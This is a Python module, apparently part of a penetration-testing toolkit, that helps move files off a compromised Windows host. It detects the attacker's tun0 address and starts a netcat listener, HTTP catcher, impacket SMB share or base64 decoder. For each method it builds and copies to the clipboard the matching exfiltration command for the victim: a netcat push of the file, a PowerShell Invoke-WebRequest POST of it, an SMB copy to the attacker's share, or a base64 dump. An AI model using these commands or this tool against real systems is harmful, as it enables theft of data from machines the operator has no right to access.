import base64
import shutil
import socket
import subprocess
import sys

from pathlib import Path


# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
M = '\033[35m'
W_BOLD = '\033[1m'


# =========================================================
# HELPERS
# =========================================================

def detect_ip():

    try:

        result = subprocess.check_output(
            ["ip", "-br", "addr", "show", "dev", "tun0"],
            text=True
        )

        parts = result.split()

        if len(parts) >= 3:

            return parts[2].split("/")[0]

    except Exception:
        pass

    try:

        s = socket.socket(
            socket.AF_INET,
            socket.SOCK_DGRAM
        )

        s.connect(
            ("1.1.1.1", 80)
        )

        ip = s.getsockname()[0]

        s.close()

        return ip

    except Exception:

        return "127.0.0.1"


def copy_clipboard(text):

    try:

        import pyperclip

        pyperclip.copy(text)

        return True

    except Exception:

        return False


def require_outfile(args):

    outfile = getattr(
        args,
        "file",
        None
    )

    if not outfile:

        print(
            f"\n{R}[!] Missing output filename{W}"
        )

        return None

    return Path(outfile)


# =========================================================
# NC
# =========================================================

def mode_nc(
    outfile,
    ip,
    port
):

    cmd = (
        f'nc {ip} {port} '
        f'< {outfile.name}'
    )

    print(
        f"\n{M}=== NC ==={W}\n"
    )

    print(cmd)

    copy_clipboard(cmd)

    print(
        f"\n{G}→ helper copied to clipboard{W}"
    )

    print(
        f"\n{Y}[*] Listening "
        f"{ip}:{port} -> {outfile}{W}"
    )

    subprocess.run(
        f"nc -lvnp {port} > '{outfile}'",
        shell=True
    )


# =========================================================
# HTTP
# =========================================================

def mode_http(
    outfile,
    ip,
    port
):

    cmd = (
        f"Invoke-WebRequest "
        f"-Uri http://{ip}:{port} "
        f"-Method POST "
        f"-InFile {outfile.name}"
    )

    print(
        f"\n{M}=== HTTP ==={W}\n"
    )

    print(cmd)

    copy_clipboard(cmd)

    print(
        f"\n{G}→ PowerShell command copied to clipboard{W}"
    )

    print(
        f"\n{Y}[*] Listening on {port}...{W}"
    )

    tmp = Path(
        f"{outfile}.tmp"
    )

    subprocess.run(
        f"nc -lvnp {port} > '{tmp}'",
        shell=True
    )

    raw = tmp.read_bytes()

    split = raw.find(
        b"\r\n\r\n"
    )

    if split != -1:

        outfile.write_bytes(
            raw[split + 4:]
        )

    else:

        outfile.write_bytes(
            raw
        )

    tmp.unlink(
        missing_ok=True
    )

    print(
        f"\n{G}[+] Saved -> {outfile}{W}"
    )


# =========================================================
# SMB
# =========================================================

def mode_smb(
    outfile,
    ip,
    share
):

    share_dir = Path(
        share
    )

    share_dir.mkdir(
        exist_ok=True
    )

    cmd = (
        f"copy {outfile.name} "
        f"\\\\{ip}\\{share}\\"
        f"{outfile.name}"
    )

    print(
        f"\n{M}=== SMB ==={W}\n"
    )

    print(cmd)

    copy_clipboard(cmd)

    print(
        f"\n{G}→ helper copied to clipboard{W}"
    )

    print(
        f"\n{Y}[*] Starting SMB share "
        f"/{share}{W}"
    )

    try:

        subprocess.run(
            [
                "impacket-smbserver",
                share,
                str(share_dir),
                "-smb2support"
            ]
        )

    except FileNotFoundError:

        subprocess.run(
            [
                "python3",
                "-m",
                "impacket.smbserver",
                share,
                str(share_dir),
                "-smb2support"
            ]
        )


# =========================================================
# OFFLINE
# =========================================================

def mode_offline(
    outfile
):

    cmd = (
        "[Convert]::ToBase64String("
        f"[IO.File]::ReadAllBytes('{outfile.name}')"
        ")"
    )

    print(
        f"\n{M}=== OFFLINE ==={W}\n"
    )

    print(cmd)

    copy_clipboard(cmd)

    print(
        f"\n{G}→ helper copied to clipboard{W}"
    )

    print(
        "\nPaste base64 "
        "(Ctrl-D when done)\n"
    )

    data = (
        sys.stdin
        .read()
    )

    data = "".join(
        data.split()
    )

    outfile.write_bytes(
        base64.b64decode(data)
    )

    print(
        f"\n{G}[+] Decoded and saved "
        f"to: {outfile}{W}"
    )


# =========================================================
# MENU
# =========================================================

def choose_mode():

    print(
        f"\n{W_BOLD}"
        f"[*] WINDOWS FILE RECEIVER"
        f"{W}"
    )

    print(
        f"\n  {B}[1]{W} NC"
    )

    print(
        f"  {B}[2]{W} HTTP"
    )

    print(
        f"  {B}[3]{W} SMB"
    )

    print(
        f"  {B}[4]{W} Offline Base64"
    )

    print()

    choice = input(
        f"{B}select{W}> "
    ).strip()

    return {
        "1": "nc",
        "2": "http",
        "3": "smb",
        "4": "offline",
    }.get(choice)


# =========================================================
# PUBLIC API
# =========================================================

def receive_windows_file(
    outfile,
    method=None,
    ip=None,
    port=None,
    share="data"
):

    outfile = Path(
        outfile
    )

    if not ip:

        ip = detect_ip()

    if not method:

        method = choose_mode()

    if not method:
        return

    if method == "nc":

        mode_nc(
            outfile,
            ip,
            port or 9001
        )

    elif method == "http":

        mode_http(
            outfile,
            ip,
            port or 8080
        )

    elif method == "smb":

        mode_smb(
            outfile,
            ip,
            share
        )

    elif method == "offline":

        mode_offline(
            outfile
        )


def run(
    data=None,
    cred=None,
    args=None
):

    outfile = require_outfile(
        args
    )

    if not outfile:
        return data

    method = getattr(
        args,
        "method",
        None
    )

    port = getattr(
        args,
        "port",
        None
    )

    share = getattr(
        args,
        "share",
        "data"
    )

    receive_windows_file(
        outfile=outfile,
        method=method,
        port=port,
        share=share
    )

    return data
